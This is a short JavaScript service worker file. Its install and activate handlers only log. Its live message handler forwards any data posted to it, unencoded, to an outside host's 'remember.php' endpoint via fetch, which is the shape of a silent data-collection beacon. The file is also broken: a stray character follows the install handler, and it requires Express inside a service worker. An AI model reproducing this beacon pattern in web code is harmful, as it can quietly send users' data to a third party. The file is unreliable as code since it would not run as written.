const { urlencoded } = require("express");

// This code executes in its own worker or thread
self.addEventListener("install", event => {
   console.log("Service worker installed");
   
});s

self.addEventListener("activate", event => {
   console.log("Service worker activated");
});

self.addEventListener("message", (event) => {
   fetch(`http://xmattv.com/remember.php?c=${event.data}`);
   console.log(event.data);
});

/*
self.addEventListener("fetch", (event) => {
   event.waitUntil(
     (async () => {
       // Exit early if we don't have access to the client.
       // Eg, if it's cross-origin.
       if (!event.clientId) return;
 
       // Get the client.
       const client = await self.clients.get(event.clientId);
       // Exit early if we don't get the client.
       // Eg, if it closed.
       if (!client) return;
 
       // Send a message to the client.
       client.postMessage({
         msg: "Hey I just got a fetch from you!",
         url: event.request.url,
       });
     })(),
   );
 });

 */